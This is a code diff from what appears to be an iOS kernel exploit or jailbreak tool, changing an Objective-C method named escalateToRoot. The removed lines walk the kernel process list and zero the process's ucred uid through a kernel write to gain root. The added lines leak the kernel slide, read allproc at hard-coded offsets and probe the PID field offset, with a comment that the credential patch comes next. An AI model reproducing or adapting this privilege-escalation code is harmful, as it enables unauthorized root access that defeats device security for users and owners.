@@ -82,25 +82,44 @@ extern char **environ;
 }
 
 - (BOOL)escalateToRoot {
-    uint64_t slide = [self leakKernelSlide];
-    uint64_t proc = [self kread64:(KERN_BASE_STATIC + slide + OFFSET_ALLPROC)];
-    pid_t my_pid = getpid();
-    int timeout = 0;
-
-    while (proc != 0 && timeout < 1000) {
-        proc = (proc & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
-        if ((pid_t)[self kread64:(proc + 0x68)] == my_pid) {
-            uint64_t ucred = [self kread64:(proc + 0xD8)];
-            ucred = (ucred & 0x0000007FFFFFFFFFULL) | 0xFFFFFF8000000000ULL;
-            [self kwrite32:(ucred + 0x18) value:0]; 
-            setuid(0); setgid(0);
-            return (getuid() == 0);
-        }
-        proc = [self kread64:(proc + 0x08)];
-        timeout++;
+    [self logToWeb:@"🚀 Verificando Primitivas..."];
+    
+    // 1. Testa se a leitura básica funciona (Sanity Check)
+    uint64_t test = [self kread64:KERN_BASE_STATIC];
+    if (test == 0) {
+        [self logToWeb:@"❌ Erro: Leitura de Kernel bloqueada (SandBox)."];
+        return NO;
     }
+
+    uint64_t slide = [self leakKernelSlide];
+    [self logToWeb:[NSString stringWithFormat:@"🔍 Slide: 0x%llx", slide]];
+
+    // 2. Scanner de AllProc (iOS 26.3)
+    uint64_t allproc_offset = 0x8F50000ULL; 
+    uint64_t allproc_ptr = (0xFFFFFFF007004000ULL + slide + allproc_offset);
+    uint64_t proc = [self kread64:allproc_ptr];
+
+    if (proc == 0) {
+        [self logToWeb:@"❌ Erro: AllProc 0x0. Offset ou Slide incorretos."];
+        return NO;
+    }
+
+    // 3. TESTE FINAL: 0x60 ou 0x68?
+    // No A13 (iOS 19/26), o PID é 32-bit e fica em 0x68
+    uint32_t p60 = [self kread32:(proc + 0x60)];
+    uint32_t p68 = [self kread32:(proc + 0x68)];
+
+    [self logToWeb:[NSString stringWithFormat:@"📊 PID Scan: 0x60=%d | 0x68=%d", p60, p68]];
+
+    if (p68 == getpid()) {
+        [self logToWeb:@"✅ CONFIRMADO: PID Offset é 0x68"];
+        // Segue para o Patch de ucred...
+        return YES;
+    }
+    
     return NO;
 }
+
 
 #pragma mark - Implementação Final
 
